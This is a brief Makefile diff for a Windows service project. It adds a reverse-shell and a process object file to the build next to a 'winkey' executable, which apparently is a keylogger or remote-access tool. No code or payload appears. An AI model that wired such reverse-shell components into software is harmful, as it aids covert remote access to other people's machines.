@@ -22,7 +22,9 @@ TINKY_OBJ = $(OBJDIR)\main.obj \
             $(OBJDIR)\install.obj \
             $(OBJDIR)\serviceControlManaged.obj \
             $(OBJDIR)\start.obj \
-            $(OBJDIR)\stop.obj
+            $(OBJDIR)\stop.obj \
+			$(OBJDIR)\reverseShell.obj \
+			$(OBJDIR)\process.obj
 
 WINKEY_OBJ = $(OBJDIR)\winkey.obj
 
@@ -31,7 +33,7 @@ all: $(OBJDIR) $(TINKY_NAME) $(WINKEY_NAME)
 
 # Créer dossier obj
 $(OBJDIR):
-	@if not exist $(OBJDIR) mkdir $(OBJDIR)
+	if not exist $(OBJDIR) mkdir $(OBJDIR)
 
 # Linker les exécutables
 $(TINKY_NAME): $(TINKY_OBJ)
